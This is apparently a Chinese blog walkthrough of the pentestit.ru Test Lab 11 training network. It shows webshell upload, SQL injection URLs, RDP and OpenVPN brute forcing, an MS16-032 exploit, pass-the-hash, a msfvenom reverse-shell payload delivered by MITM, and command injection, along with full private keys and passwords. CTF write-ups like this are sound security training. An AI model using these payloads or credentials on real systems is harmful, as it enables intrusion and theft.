---
title: TEST LAB 11
layout: post
tags:
  - sec
  - ctf
  - pentest
category: 
  - hack
  - tools
  - game
comments: true
share: true
description: pentestit.ru的第十一期环境
---

* TOC
{:toc}

pentestit.ru的第十一期环境

<!--more-->



![网络拓扑图](/img/game/TESTLAB/TESTLAB11/1511926938019.png)



## 连接实验室vpn

连接好实验室vpn之后，`ping 192.168.101.10`，使用浏览器打开`192.168.101.10`：

![](/img/game/TESTLAB/TESTLAB11/1511926583955.png)

![Windows连接](/img/game/TESTLAB/TESTLAB11/1511926741333.png)


### kali连接vpn方法1

0x01 在kali上安装vpn客户端：

```bash
apt-get install network-manager-openvpn
apt-get install network-manager-openvpn-gnome
apt-get install network-manager-pptp
apt-get install network-manager-pptp-gnome
apt-get install network-manager-strongswan
apt-get install network-manager-vpnc
apt-get install network-manager-vpnc-gnome
```

0x02 然后直接导入`https://lab.pentestit.ru`下载的`.ovpn`文件

### kali连接vpn方法2

0x01 安装openvpn：

```bash
apt-get install openvpn
```

0x02 新建文件夹,将`lab.ovpn`, `pass.txt` 和 `ovpn.sh` 复制到 `/opt/pentestit/`：

```bash
cd /opt && mkdir pentestit
```

> `lab.ovpn`文件信息如下：

> ![ovpn](/img/game/TESTLAB/TESTLAB11/1511925706657.png)

> `pass.txt`为https://lab.pentestit.ru/how-to-connect显示的账号和登陆密码。

> `ovpn.sh`为:

```bash
#!/bin/bash
openvpn --config /opt/pentestit/lab.ovpn &```
```

0x03 连接openvpn：

```bash
chmod +x /opt/pentestit/ovpn.sh
/opt/pentestit/ovpn.sh
```

0x04 停止连接：

```bash
killall openvpn
```

### kali连接vpn方法3 

```bash
openvpn lab.pentestit.ru.conf
```

![Alt text](/img/game/TESTLAB/TESTLAB11/1511926114934.png)



tEQGbU9pEzGj

### windows连接vpn

0x01 到http://openvpn.net/index.php/open-source/downloads.html 下载[openvpn](http://openvpn.net/index.php/open-source/downloads.html )

0x02 将`lab.ovpn`和`pass.txt`复制到`C:\Program Files\OpenVPN\config`路径下

0x03 使用管理员权限运行openvpn，连接就行

## 攻击

### CRM Token

**0x01 nmap扫描**

```
root@kali:~# service postgresql start

root@kali:~# msfconsole
....

msf > db_status
[*] postgresql connected to msf
msf > db_nmap -sS -sC -sV -v -A 192.168.101.10
...
msf > db_nmap -sS -sC -sV -v -A 192.168.101.11
```

> `-sS`

![Alt text](/img/game/TESTLAB/TESTLAB11/1512001683360.png)

![Alt text](/img/game/TESTLAB/TESTLAB11/1512001627051.png)

![Alt text](/img/game/TESTLAB/TESTLAB11/1512001588370.png)



![Alt text](/img/game/TESTLAB/TESTLAB11/1512000399297.png)
![Alt text](/img/game/TESTLAB/TESTLAB11/1512000413560.png)
![Alt text](/img/game/TESTLAB/TESTLAB11/1512000426995.png)
![Alt text](/img/game/TESTLAB/TESTLAB11/1512000465316.png)


**0x02**

![Alt text](/img/game/TESTLAB/TESTLAB11/1512000606287.png)

wpscan 

```
wpscan -a "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.1" -u 192.168.101.10
```

![Alt text](/img/game/TESTLAB/TESTLAB11/1512000128660.png)
![Alt text](/img/game/TESTLAB/TESTLAB11/1512000215076.png)

![Alt text](/img/game/TESTLAB/TESTLAB11/1512001307330.png)


尝试sqlmap注入攻击，一直失败。

```bash
searchsploit "Vtiger CRM 6.3.0"
```

![Alt text](/img/game/TESTLAB/TESTLAB11/1512002296745.png)

[vTiger CRM 6.3.0 - Authenticated Remote Code Execution](https://www.exploit-db.com/exploits/38345/)

使用`amdin`账户和` blackstar`的密码登陆crm后台：

![Alt text](/img/game/TESTLAB/TESTLAB11/1512006693662.png)

通过`右上角设置—>rm设置->模板—>公司详细信息—>编辑`上传图片[shell](https://github.com/JohnTroony/php-webshells/blob/master/b374k-mini-shell-php.php.php)(https://github.com/JohnTroony/php-webshells/blob/master/b374k-mini-shell-php.php.php)。

![Alt text](/img/game/TESTLAB/TESTLAB11/1512021073980.png)

在上传小马的时候，通过burpsuit拦截，更改图片的文件后缀名为`php`，且删除小马代码中的`php`：

![Alt text](/img/game/TESTLAB/TESTLAB11/1512021141605.png)


上传成功，然后找到图片路径`http://192.168.101.10:88/test/logo/shell.php`:

![Alt text](/img/game/TESTLAB/TESTLAB11/1512020952603.png)


通过shell找到了token,token为`Give_me_all`:

![Alt text](/img/game/TESTLAB/TESTLAB11/1512020697693.png)

![CRM站点的ip情况](/img/game/TESTLAB/TESTLAB11/1512081248950.png)
![Alt text](/img/game/TESTLAB/TESTLAB11/1512081704041.png)

```bash
$dbconfig['db_server'] = 'localhost';
$dbconfig['db_port'] = ':3306';
$dbconfig['db_username'] = 'crmuser';
$dbconfig['db_password'] = 'PJB&*24^2e2';
$dbconfig['db_name'] = 'testlabcrm';
$dbconfig['db_type'] = 'mysqli';
$dbconfig['db_status'] = 'true';
```

本来想做进一步的攻击，但是有waf，就先做其他的了。

### Site TOKEN

看着后台信息的邮箱，立即想到开始扫出的邮箱页面，考虑将管理员邮箱`admin@test.lab`作为账户登陆。将CRM后台管理员信息收集做成字典，尝试得出密码为`darthvader`：

![Alt text](/img/game/TESTLAB/TESTLAB11/1512022460798.png)

从邮箱中得到私钥：

![Alt text](/img/game/TESTLAB/TESTLAB11/1512024529838.png)


利用私钥登陆:

```bash
root@kali:~/Desktop# chmod 600 officetwo.key 
root@kali:~/Desktop# ssh -i /root/Desktop/officetwo.key -p2222 tech@192.168.101.11
```

![Alt text](/img/game/TESTLAB/TESTLAB11/1512024420000.png)

查看ip情况：

```bash
ip addr show
```

查看文件情况，寻找有用的信息：

![查看隐藏文件](/img/game/TESTLAB/TESTLAB11/1512066180000.png)


![Alt text](/img/game/TESTLAB/TESTLAB11/1512024635531.png)

![Alt text](/img/game/TESTLAB/TESTLAB11/1512025314177.png)

查看具有root权限的进程：

```bash
ps aux | grep root
```

![Alt text](/img/game/TESTLAB/TESTLAB11/1512064932126.png)

查看

![Alt text](/img/game/TESTLAB/TESTLAB11/1512065566386.png)

打印路由:

```bash
netstat -nr
```

![打印路由](/img/game/TESTLAB/TESTLAB11/1512065673171.png)

在`/etc/openvpn/`找到了`.conf`文件：

![office-2用户](/img/game/TESTLAB/TESTLAB11/1512068918798.png)

知道了账户可能为`Office-2`,openvpn连接的ip为`192.168.101.10` ，端口为`1194`。

查看`/opt/openvpn/auth.txt`，没有权限：

![Alt text](/img/game/TESTLAB/TESTLAB11/1512069026741.png)

使用`openvpn --config server.conf`登陆还需要密码，立即进行下一步——找密码。

![Alt text](/img/game/TESTLAB/TESTLAB11/1512069536329.png)

然后直接使用`ls -alhR /var/`大概查看一下目录和文件情况，果然有发现。查看敏感信息的文件，找到了openvpn的爆破脚本、字典，再根据上面找到了的`openvpn --config server.conf`文件进行爆破：



![Alt text](/img/game/TESTLAB/TESTLAB11/1512071802501.png)

*爆破脚本：*

```bash
#!/bin/bash
# By Galkan 

openvpn_binary_path="/usr/sbin/openvpn"

function brute_force()
{
    brute_file="`mktemp /tmp/brute_force_openvpn_$USER.XXXXXX`"
    output_file="`mktemp /tmp/brute_force_openvpn_$USER.XXXXXX`"

    rm -f $brute_file $output_file

    user_name="$1"
    password="$2"

    echo "$user_name" > "$brute_file"
    echo "$password" >> "$brute_file"

    $openvpn_binary_path --config $openvpn_config_file --auth-user-pass "$brute_file" > $output_file &
    
    while [ 1 ]
    do
        if [ -f "$output_file" ]
        then
            cat $output_file | grep -q "Options error"
            if [ $? -eq 0 ]
            then
                echo "ERROR: `cat $output_file | grep "Options error"`"
                break
            fi

            cat $output_file | grep -q "SIGTERM\[soft,auth-failure\] received, process exiting" 
            if [ $? -eq 0 ]
            then
                echo "$user_name:$password -> FAILURE"
                break   
            fi

            cat $output_file | grep -q "Initialization Sequence Completed" 
            if [ $? -eq 0 ]
            then
                echo "$user_name:$password -> SUCCESS"
                break   
            fi
        else
            continue
        fi
    done
    
    openvpn_pid="`pidof openvpn`"
    

    rm -f $brute_file $output_file 
}



function main()
{
    dict_file="$1"

    for vpn_file in $openvpn_binary_path $openvpn_config_file $dict_file
    do
        if [ ! -f "$vpn_file" ]
        then
            echo "$vpn_file : Dosyasi Sistemde Bulunamadi !!!"
            exit 3
        fi
    done


    cat $dict_file | while read -r line
    do
        user_name="`echo "$line" | cut -d ":" -f1`"
        password="`echo "$line" | cut -d ":" -f2`"

        result="`brute_force "$user_name" "$password"`"
        echo "$result"

        echo "$result" | grep -Eq "^ERROR"
        if [ $? -eq 0 ]
        then
            break
        fi  
    done
}



if [ ! $# -eq 2 ]
then
    echo "Kullanim: $0 <dict_file> <vpn_config_file>"
    exit 1
else
    dict_file="$1"
    openvpn_config_file="$2"

    main "$dict_file" 
fi
```

不过在`/var/tmp/.6469636d`中找到了`aut.txt`,和刚才爆破结果一样密码是`starwars`：

![Alt text](/img/game/TESTLAB/TESTLAB11/1512070950168.png)

连接第二层openvpn,从`192.168.101.0/24`进入了`172.16.0.0`：

![Alt text](/img/game/TESTLAB/TESTLAB11/1512072622127.png)

目前进入网络拓扑图：

![Alt text](/img/game/TESTLAB/TESTLAB11/1512072794228.png)

使用[nmap高并发的扫描](http://www.lijiejie.com/nmap-fast-scan-large-networks/)方法进行扫描： 

```bash
root@kali:~# nmap -v -sn -PE -n --min-hostgroup 1024 --min-parallelism 1024 -oX nmap_172_output.xml 172.16.0.0/24
```

![172段存活的机器](/img/game/TESTLAB/TESTLAB11/1512078083694.png)

使用msf调用nmap模块扫描：

```bash
msf > db_nmap -sS -sC -sV -v -A 172.16.0.10-18
```

![msf中列出服务](/img/game/TESTLAB/TESTLAB11/1512079415856.png)

![msf列出主机](/img/game/TESTLAB/TESTLAB11/1512079433114.png)

结合网络拓扑图看：

![网络拓扑图](/img/game/TESTLAB/TESTLAB11/1512080752833.png)


- **AD**:`172.16.0.10`
- **CRM:**:`172.16.0.12`和`192.168.101.10`
- **CUPS:**`172.16.0.14`
- **ACCESS CONTROL:**`172.16.0.16`和`172.16.0.17`

根据端口扫描情况，还是从web开始着手，即`172.16.0.11`。该站点和之前的`192.168.101.10`的wordpress站点一样的，都有kittycatfish2.2插件，目测内网内没有waf，不像公网上的那个站点一样。尝试sql注入。

猜字段：

```bash
http://172.16.0.11/wp-content/plugins/kittycatfish-2.2/base.css.php?kc_ad=16%20order%20by%203--%20-
```

![Alt text](/img/game/TESTLAB/TESTLAB11/1512116084454.png)

报错为3，即字段是`2`。

知道字段之后，利用联合查询。

```bash
http://172.16.0.11/wp-content/plugins/kittycatfish-2.2/base.css.php?kc_ad=16+union+select+0x6b635f61645f637373,%28SELECT%20GROUP_CONCAT%28table_name%29%20FROM%20information_schema.tables%20WHERE%20table_schema=database%28%29%20GROUP%20BY%20table_name%20LIMIT%200,1%29
```

![Alt text](/img/game/TESTLAB/TESTLAB11/1512195065290.png)

```
http://172.16.0.11/wp-content/plugins/kittycatfish-2.2/base.css.php?kc_ad=16+union+select+0x6b635f61645f637373,(SELECT%20GROUP_CONCAT(column_name)%20FROM%20information_schema.columns%20WHERE%20table_name=0x746c5f746f6b656e%20GROUP%20BY%20table_name%20LIMIT%200,1)
```

![Alt text](/img/game/TESTLAB/TESTLAB11/1512195093599.png)




登陆`192.168.101.11`这台机器，发现其内网还有三台机器，使用扫描器扫描端口：

```bash
tech@tl11-gw-2:~$ nmap -sV -n -Pn 192.168.13.1-3
```


![Alt text](/img/game/TESTLAB/TESTLAB11/1512637696380.png)



三台机器都开放了3389端口。


通过ssh对`192.168.13.1`进行端口转发，将3389端口转发到本地的3389端口：

```bash
root@kali:~# ssh -L 3389:192.168.13.1:3389 -p 2222 -i ~/Desktop/officetwo.key tech@192.168.101.11
```

![Alt text](/img/game/TESTLAB/TESTLAB11/1512715463471.png)

下载[freerdp](https://github.com/FreeRDP/FreeRDP)（该工具可以通过hash传递连接远程桌面）安装：

```bash
apt-get install freerdp-x11
```

打开3389，连接：

```bash
xfreerdp /v:127.0.0.1 -sec-nla /u:""
```

![Alt text](/img/game/TESTLAB/TESTLAB11/1512715662641.png)

登陆失败之后，得到账户为`arm554`,进行爆破：

```bash
root@kali:~# hydra -t 8 -V -l arm554 -P /usr/share/wordlists/rockyou.txt rdp://127.0.0.1
```

![Alt text](/img/game/TESTLAB/TESTLAB11/1512716038392.png)

爆破得到密码为`tiger`，使用该密码登陆远程机器：

```bash
rdesktop -u arm554 -r disk:share=/root/Downloads/ 127.0.0.1
```

![Alt text](/img/game/TESTLAB/TESTLAB11/1512716933414.png)


利用[ms16_032](https://www.exploit-db.com/exploits/39719/)提权：

```bash
PS C:\Users\arm554\AppData\Local\Temp> powershell -ExecutionPolicy Bypass

PS C:\Users\arm554\AppData\Local\Temp> Import-Module .\39719.ps1

PS C:\Users\arm554\AppData\Local\Temp> Invoke-MS16-032
```

![Alt text](/img/game/TESTLAB/TESTLAB11/1512722200207.png)

添加用户：

```bash
C:\Users\arm554\AppData\Local\Temp>net user sb sb /add
The command completed successfully.


C:\Users\arm554\AppData\Local\Temp>net localgroup administrators sb /add
The command completed successfully.
```

![Alt text](/img/game/TESTLAB/TESTLAB11/1512722385194.png)

登陆新添加的账户，找到了token：

![Alt text](/img/game/TESTLAB/TESTLAB11/1512723064279.png)

### AD Token

下载文件：

![Alt text](/img/game/TESTLAB/TESTLAB11/1512725270473.png)

获得一些信息


使用nmap扫描`172.16.0.10`:

```bash
nmap -A -sV -n 172.16.0.10
```

![Alt text](/img/game/TESTLAB/TESTLAB11/1512926932598.png)

扫描结果可以看出该IP是AD.

使用msf的信息收集模块进行Kerberos域用户枚举：

```bash
msf > use auxiliary/gather/kerberos_enumusers

msf auxiliary(kerberos_enumusers) > set RHOST 172.16.0.10

msf auxiliary(kerberos_enumusers) > set USER_FILE /root/user.txt

msf auxiliary(kerberos_enumusers) > set DOAMIN test.lab
```

![Alt text](/img/game/TESTLAB/TESTLAB11/1512933753800.png)

![Alt text](/img/game/TESTLAB/TESTLAB11/1512933785834.png)

`arm554`这个用户存在于`test.lab`这个域。

![arm554的hash](/img/game/TESTLAB/TESTLAB11/1512933951020.png)

使用smbclient连接该IP,尝试使用`tiger`尝试连接失败：

```bash
smbclient -L 172.16.0.10 -U arm554
```

![Alt text](/img/game/TESTLAB/TESTLAB11/1512934174843.png)


进行hash传递：

```bash
root@kali:~# pth-smbclient --user=arm554 --pw-nt-hash -m smb3 -L 172.16.0.10 \\\\172.16.0.10\\ 6361DEA164EE8FE91FE7B117FBC9CA5E
```

![Alt text](/img/game/TESTLAB/TESTLAB11/1512935252882.png)

爆出共享的文件，尝试直接连接到`files`文件夹，然后连接成功：

```bash
root@kali:~# pth-smbclient --user=arm554 --pw-nt-hash -m smb3 \\\\172.16.0.10\\files 6361DEA164EE8FE91FE7B117FBC9CA5E
```

![Alt text](/img/game/TESTLAB/TESTLAB11/1512935352871.png)

使用`get token.txt`下载`token.txt`,并查看得到token是`No_more_admins`：

![Alt text](/img/game/TESTLAB/TESTLAB11/1512968261223.png)

### CUPS TOKEN

根据信息，尝试通过arp表找子网。就直接访问`172.16.0.14`查找线索。

尝试SQL注入，username：`admin`,password:` admin' or 1=1 --` ，爆出图片:

![Alt text](/img/game/TESTLAB/TESTLAB11/1512968841462.png)

将`004e006f005f00700061007000650072`转换成ascii码:

```bash
echo '004e006f005f00700061007000650072' | xxd -r -p
```

得到`No_paper`


### Director Token

继续翻找图片：

![Alt text](/img/game/TESTLAB/TESTLAB11/1512969154528.png)

草--根据图片，一个个敲进去：

```bash
-----BEGIN RSA PRIVATE KEY-----
MIIEpAIBAAKCAQEA4CxmKK2/kvV0+srp24bVZm+yYvCz+rvgHHxX1w7F0oD8aUDI
won79K9XpntFDPUvtJRMg9WqK/zKUwLsMQLGWT66PT4GVbQw4Nr56rOrBIuag/qg
o9WcX0AfIyFYFCNz0TnLfRXSDcSQY0CRK8WfKx5c8uP2kudtzAGv5GQCpSjM2uNV
shOu7xmgo/AMUQvPi8kvD/gAme9G8WkTgpVpAwlsthjxQ9fEO6abHHkjbGGec0O8
4T7Bo2nU8bHjr6Jd+dzUAvytblG1yNvGIybAFAsVqUHjbt9wGZgFKr1kA+3ZCbyF
qFZZ37dpZr2grZXwzlCtPUJGuMfCq7N0ZhmcAwIDAQABAoIBAQDCXPx+TJcLXhJ8
164HjlI8LKAoNLZ3sKlRSWYHqmFOcFNpFqh6M5Tmw5hlWf+2imdAVEw7Cegvl0/8
xU3v+I3tFvv22W44pLC0ZGfHXNvsZvYjdAwPwMeBtmDI3sI1Q7/JKikKXP7wvPrL
c1Hq979XbU39sjU5jbqe5N+SUDwS4Tu79L0uXehnqvCSlyIU9joDhvW87DeaLRaQ
wwkKR9gnPtiKebZ73VGParJ42CZlRgfEOvoLWUk+YrhRfZ9r4uva0IHbZ1LhqNcL
k0OlKEDUDzuju0/YwgBSZVSrhkCAnCnipsxQMc4g2aytPOTdKz4BtF+cZV/rXhyM
kSPIeh1xAoGBAPJfcCQWqsq/dwwOC9I9jWj4W9xAFPbaPSq1oGwNr0ugZ/4DZLGe
glGte8iG/Tc1Lb1Ege2dYPRR5OeFhyo8tADPKleFvDBYGN2asf4JirljxrW5F+ON
q5paXqjbaBKk/Z6f08UlwxjSHRHOWqEvYZkm5bAxrufNKBVpwVWHU6eNAoGBAOzH
AryHBdo45qLnzJR87zDftNNrualVmhWu+h+I7zj4hr52gM/TheHL/ODJZCyZU3vt
7ncDjUM91xwh63vkCiByEYk4vTGnmaj9brmndracJ7jwwSUn/YqPj0D3yD0lrpxd
PLn0c1ic5jaoTSWZN748PoPnP+CPvhjQYvxX5OXPAoGALmnEScTlc+nyXCaccOhE
miNlQ+opmZP1PqaFT+vw876F64iu0ayu/AEiwSXIe7f9SE9EKkKG/IJqOUPCvH3f
YoBIdXUwsnlMWbNz/lfJbvMCbG5Detn4UJiZo/BQH7Hht2mX3hr7H1etJWnExTUT
lYZzWahI/C23TVJxKXW+uUkCgYEAnLDOhMit/M3vAxt27UUIXUWNuuPtSmH9yB+1
cq0B8qe1M9HkSKRoUxbVUES2QDVvY/H+/0+gakFAW2OvHJu6f+I87JxZx8RsEcM1
RTMngo0wVFku2FHwnYOHf6z6HE0VknC5QS4eLyQVzVHvS9RraT8g99VPFmLKoE43
U1svJU0CgYAecYtH3ZvIwPA85sTuTkKAGMmvRxzPnQkyjUF9BwN+B1mfL4uZyJVy
VVWhCwXf/h9G3fKzuV0m0Dz6O7r5DqRqs0uCNbxPaS8qWPcRckwV2Y9htMjXLtXU
nOV4UZBbQSZb/AoSFdcCBjonbudkiAxzm0STdiQ92kZNavvfZAjXQw==
-----END RSA PRIVATE KEY-----
```

使用ssh连接：

```bash
root@kali:~# chmod 600 morgan.key 

root@kali:~# ssh -i morgan.key morgan@172.16.0.252
```

![Alt text](/img/game/TESTLAB/TESTLAB11/1512970645892.png)

在机器上执行`/sbin/route -nee`，查看路由:

![Alt text](/img/game/TESTLAB/TESTLAB11/1512970783649.png)

安装[sshuttle](https://github.com/apenwarr/sshuttle)：`pip install sshuttle`,然后使用sshuttle进行端口转发:

```bash
sshuttle -e "ssh -i morgan.key" -r morgan@172.16.0.252 192.168.10.0/24 192.168.11.0/24 192.168.12.0/24
```

![Alt text](/img/game/TESTLAB/TESTLAB11/1512971216269.png)

使用xfreerdp连接`192.168.12.1-3`机器，试出之前找出的密码可在`192.168.12.2`上登陆：

```bash
xfreerdp /u:admin /p:77_GrantedSuperAdmin_77 /v:192.168.12.2
```

登陆进去之后翻找文件，在soft文件夹找到了`nc`和`Intercepter-NG`：

![Alt text](/img/game/TESTLAB/TESTLAB11/1513062966698.png)

进行`smart scan`，扫描出三个IP：

![Alt text](/img/game/TESTLAB/TESTLAB11/1513063004866.png)

进入DHCP，设置参数，serverip和DHCP Scope为`192.168.12.1`,网关为`192.168.12.3`进行嗅探：

![Alt text](/img/game/TESTLAB/TESTLAB11/1513067322375.png)

在RAW中的`Pcap filter`设置为`port not 3389`：

![Alt text](/img/game/TESTLAB/TESTLAB11/quake3.png)

`192.168.12.1`不断向`192.168.12.3`请求`quake3.exe`这个程序。可进行中间人攻击，使得目标机器下载我们定制的`quake3.exe`。

msfvenom生成`quake3.exe`,然后nc上传到机器上。

```bash
msfvenom -p windows/shell_reverse_tcp LHOST=192.168.12.2 LPORT=80 -f exe > quake3.exe

nc -w 3 192.168.12.2 1234 < quake3.exe
```

内网机器：

```bash
nc -nvlp 1234 > quake3.exe
```

Intercepter进行MITM攻击，在MITM模式下设置`SSL Strip`和注入规则:

![](/img/game/TESTLAB/TESTLAB11/inject_rules.png)

![](/img/game\TESTLAB\TESTLAB11\mitim_inject.png)

攻击成功返回Shell：

![](/img/game/TESTLAB/TESTLAB11/inject_nc_success.png)

找到了token:`Sn1ff_Sn1ff`

![](/img/game/TESTLAB/TESTLAB11/192168111ssh_key.png)
![](/img/game/TESTLAB/TESTLAB11/192168122ssh_key&flag.png)

### Connect Token

由于`remote.key`和`todo.txt`在机器上，需要下载下来。并不能出网，就将磁盘挂载，直接复制得到：

```bash
xfreerdp /u:admin /p:77_GrantedSuperAdmin_77 /v:192.168.12.2 +clipboard +home-drive
```

![](/img/game/TESTLAB/TESTLAB11/下载ssh_key_mitim.png)


192.168.11.1的`remote.key`的具体私钥内容如下：

```bash
SSH pub. key. from remote@192.168.11.1.txt


-----BEGIN RSA PRIVATE KEY-----
MIIEpAIBAAKCAQEA7Mksn+uKhCIsc344y9C3JqPHG7TIS4FoTWMwcq1frxD1oJry
whd4mcjui3jCZfx5+aUuQLXXWJYnETFY4rmOUgWZxZbF1xgl8Ba+6OrcwuPp+UDQ
yB1+RREnOldqFXxKEu1os6sKNY5kzsnynl4HkNyVltQpTy/JHmLBf3WxN0pwpRqE
lozKY/T3UnXI684lzFR4asQE06GOyTPPgAkPSoqQubFn+/0l/4vLqJKkjyrnmeJC
N9oGiPcQZJO0Biqufwwadt1p3Hi3yAOoR7wqysx7SQf+6URNOQVB8J3fnKecGUu5
FZfvSmOTFjLK6LllBhtDz5MBCFBKnm5z3gyiswIDAQABAoIBAQDcHng5gkGWbB5e
jyxFbJWWehISk5DPgFFx/49+S+XzXRS6ZNDf1enrLHt1dKFjJb5OcVv6FBFI7O0M
co9q1YyUe1hj8rGgL3a1Jq/63rqzAiTz7WkpXyGPG08YUULxDkXeKo122L3445Kb
GelNh6QI6sa1HC36yzVv5eZzkvlXpzYYXChdio117IbjxDo4/RF/vmsmvZ+zANZX
Cr6bWKVhglsH6Z41vAyvjeH20/04sPhM1ic2Xakq3NVONEFw8WLypuRV3Bl9PlCl
JvyErJBy0LtRHyzPrBWcx1eoMyCAvlDf3140P12F+rfviQYbtfDCRuTvvaIPzOT8
sodXyCihAoGBAPoK8jl3Deqy6cfyPMaABxVPNQj5dlkmvnI7k0D1qlTl6nk3fh+b
4Wqh2ORsLE4vZC/u3tIwM/iVJPIy5MJq1WbCIrhrNWx6ZbriCKEk4K4aHLLL9C96
Af2i7b600xX2iHTmkmKXpZa5R46Os1TkpC/1oRE5PeBk3FHD/VPoh0lFAoGBAPJt
XzOaC8cqvaWrCbzMQetOcqOCJD7xYHVqrdyWVyC+YViP6awdpAQyLC6h8cZg7UDu
EPwJcYPkB6IjufAFlI/pG8bwk7SZfYqkGG8+yZT/NTYm4Fp5Sh8CD7H2FBEdyBTv
hnf5i3mBKGWirA/jdWnOcNsTGmBmv15h9yZ4he+XAoGADBBfI3qlBz/em7EKUaF3
tgV+T5KJrT97TNOnBSlVMIdvSq3sveWteJGaf1rgwFz0/oMN6SI+P64ifDUMaHzz
EuQm/LLffv5gziV9uRioZn4ICHBita+zTOOBiQP8c0DT0KAXS/55FM6Xrz8fU+c8
LLwzKzuRyrPTFXbZUCUV8ekCgYEAwKyqqIF7cO0IU35Pu+z/SzxLIqcRlbET/94s
lpAqaUzGY7PlfTUFoYwaz2lIlml8x0ku2JHM1Y1Lf9MzOY/F1mbn+8JDMpt3StRG
00usvS3kpchaMa4KegCSZtd0dXIdDn6ceggskQJVEAotBGe8br5ztbpGEW44FJR5
8OqDULsCgYBdBDZx17yhWgKgOwRdkSuUWW8U+BoQ4cX+o6itOmGBo+wv2TIZtkWm
fFgEfK/yZHAJAExuENuVDN1uXpDDwdQNOTW2MDlyJGsjVdJXl83pEwAiaTzAXFt3
oTJEwCxzgOzwrKfNJR57QV8T4JCj7TuSaSkk2n07gG4GdThBb6BorQ==
-----END RSA PRIVATE KEY-----
```

使用sshuttle将路由机器和本地的kali机器做了ssh隧道，添加了`192.168.10.*`~`192.168.12.*`网段的路由,直接可以连接`192.168.11.1`的机器：

```bash
ssh -i remote.key remote@192.168.11.1
```

![](/img/game/TESTLAB/TESTLAB11/ssh登陆remote.png)

登陆之后有个进入选项，分别选择`Srv1`和`Srv2`：

![](/img/game/TESTLAB/TESTLAB11/进入remote_192_168_11_1.png)

登陆后VM机器的IP不同。

查看机器权限,都是非root权限：

![](/img/game/TESTLAB/TESTLAB11/192_168_11_1_用户权限.png)

在机器上查看不能出网，且gcc又不能用。暂时不适用提权测试脚本。先尝试登陆选择机器时候的输入能否命令注入。

**命令注入：**

在选择VM机器的输入处，分别使用`Srv3;sleep 3`和`Srv3;sleep 10`进行测试，有不同程度的时间延迟。图中1标记的地方立马报错出来，随后2根据时间的延迟长短出现：

![](/img/game/TESTLAB/TESTLAB11/192_168_11_1_基于时间的命令注入.png)

不止是时间延迟的情况，还有在输入不是`Srv1`和`Srv2`情况下会出现标准的输出错误([`STDERR`](https://en.wikipedia.org/wiki/Standard_streams#Standard_error_.28stderr.29))，即图中的1标记处的输出[错误](https://unix.stackexchange.com/questions/164217/write-to-stderr)。

此时，可以为了看到更多的情况，将标准输出（STDOUT）重定向到标准错误(STDERR)，使用whoami测试重定向STDERR的情况：

```bash
Srv3;whoami 1>&2
```

![](/img/game/TESTLAB/TESTLAB11/192_168_11_1_whoami_重定向STDERR测试.png)

测试得出可以进行命令注入——STDOUT重定向到STDERR

尝试通过命令注入将会话切换到bash环境：

```bash
Srv3;bash 1>&2
```

但是bash命令不能运行，直接使用[dash](https://www.cyberciti.biz/faq/debian-ubuntu-linux-binbash-vs-bindash-vs-binshshell/)命令切换会话成功，再输入bash切换会话成功：


![](/img/game/TESTLAB/TESTLAB11/192_168_11_1_提权成功.png)

查看remote用户`.ssh`文件夹:

```bash
remote@tl11-192-168-11-1:~/.ssh$ cat id_rsa
-----BEGIN RSA PRIVATE KEY-----
MIIEpAIBAAKCAQEA0xrDWTXXzq18+mTF7hoAFI9ZPoQKItWEUb/1k8sP2I652Po3
Ky3LEGDDlKwIgZGPJbo3CKSSA59e2cOkSWvFIC9qnWQHrWrs6uNDBbVLVxavopdW
/N9aXuhNa/pES18lRnrfrtwmAgYYc7q8IyMy1sO0diXCNunKLqwbGjpvYz1x1xqS
u01280uO6u5JZ0TWSvsRWIOVbyypMiz4d0UdM+XbGSh8gJGtiZDao80wMIeuEeHf
TgNJa/iInaVyKOpV2l8S4b7Opkw0hYSGOUAJqFlfZoILU2yO1+ibCOupFoM/GihH
deFkiKZyrJ7P5bnJK4gaRU8+R1H81oO8ktUL/wIDAQABAoIBACTnm9j/qa+O8rdP
YK7EStlNShu8t4zpaM1l0oe4yxdftCuzamuZANPnJqnZ/U6xZKYCzNYs9v29IbbO
Fe1j8r0yrN/A+fqeI7bYbgIUdIxQAfpZnLJuVX0b/VTwFnpassiEeJA4GkjmSeYJ
chRuddfHtMemyDITYu4P1lkaeBiP9uV3VRoUSBPuxLLqKbXdCu3pnmjuL1CtO5WY
ZvgWa9Ss1q6IS5f6mtCAMGf6QhxNmi04uUDXxsQvw2nCsHIBCuw2xbSqYyI87ARZ
FvjlNMx2Jl1JMbFuaggHr3TTdnynFJjYYg5gMgbiz1h3OlNBjttMyTa6hjKoxa7Q
r6GogqECgYEA9wdgQpPbYpB6p2KXpMf4/7o3XdHabfmM0cCXDKZO2n56mkCGEVqY
9aN2CnQzVMiTujP4d9/VOEhGrKsZ75f5bnyBcO27C/b7bAQR7c48ZsCrkac8JNn1
HdW0us9gc0xQQdOHAP06Dp0J+jaBXBcqs8Eq2DzEeNOOKBSS0a80FzECgYEA2sVm
SQ/L8gP3qGqrC9pV8USf8WhkpAKmbWajHTV1W4JB8+2u83FyUkBxcdJdgLhJnEIg
8Q8xcx7bRbbWoJqa8kmPveVxrVqyLUXgAkOMyxC6DWWMN/kSuY0Oo6M8FN+5/R8D
hqClALgiITNFJAbHs68l/RyXQ3LCmDDq5Zuy6i8CgYB2kyHPk22BOFzHr/mebSbG
ibo93Jd+poTDwjA/MC01j/SFymcQOW6mqhnlFrX1Anp2rK+dyuFsLLVP+KlwaoCe
WkE/1b0tFxbEWIfKoG453E3+kkm6Xqzb71LbQOPJNF5p2oE5JlQR46uAYV1iuPQU
aKqKNVERtmrMLmPzJqhYYQKBgQCozXfHGDE9ZGJLyUKBus5lg5YGJ47AHmtcLr3d
Y8pR+Yf6N4Ouw/J6FM90C+Wp1Ii30S6p0hdNxJlciV/CPIkiOjB3TfsQz9J7rFbU
aFrStO1aOOigp8cS9Qw+p01MrfRMowmNb5bhnzJ2e6D102Vz98lQLCdrG7maxOP6
ltDOcQKBgQDM+6qhd8K2ZVzl+S4ANUcQg/WO4cWV4HGmKEh5O7YjBpGwpO4d47+z
NCa8IJu+tbG3whhCbir8YGmMP+6frlr/uT3el8S9UGd/DKOeKdD1p7bEd7IlGZjm
Y+nnLpKlWSnrnF1EVKpyap1KXkB4d8+Y/Aux40exmiaK0dayjMl9oA==
-----END RSA PRIVATE KEY-----


remote@tl11-192-168-11-1:~/.ssh$ cat authorized_keys 
